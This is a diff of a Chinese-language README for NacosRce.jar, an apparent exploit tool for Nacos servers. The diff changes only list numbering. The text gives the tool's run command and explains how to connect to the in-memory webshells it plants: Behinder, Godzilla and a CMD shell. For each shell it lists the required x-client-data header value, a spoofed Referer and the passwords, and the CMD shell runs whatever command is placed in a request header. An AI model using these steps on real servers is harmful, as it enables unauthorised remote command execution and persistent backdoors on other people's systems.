@@ -20,19 +20,19 @@
    <br />java -jar NacosRce.jar ip:port memshell windows
 
 <br />内存马说明：
-<br />1. 冰蝎内存马：
+<br />一、冰蝎内存马：
    <br />1、需要设置请求头x-client-data:rebeyond
    <br />2、设置Referer:https://www.google.com/
    <br />3、路径随意
    <br />4、密码rebeyond
    ![img.png](img.png)
-<br />2. 哥斯拉内存马：
+<br />二、哥斯拉内存马：
    <br />1、需要设置请求头x-client-data:godzilla
    <br />2、设置Referer:https://www.google.com/
    <br />3、路径随意
    <br />4、密码是pass 和 key
 <br />![img_1.png](img_1.png)
-<br />3. CMD内存马：
+<br />三、CMD内存马：
    <br />1、需要设置请求头x-client-data:cmd
    <br />2、设置Referer:https://www.google.com/
    <br />3、请求头cmd:要执行的命令
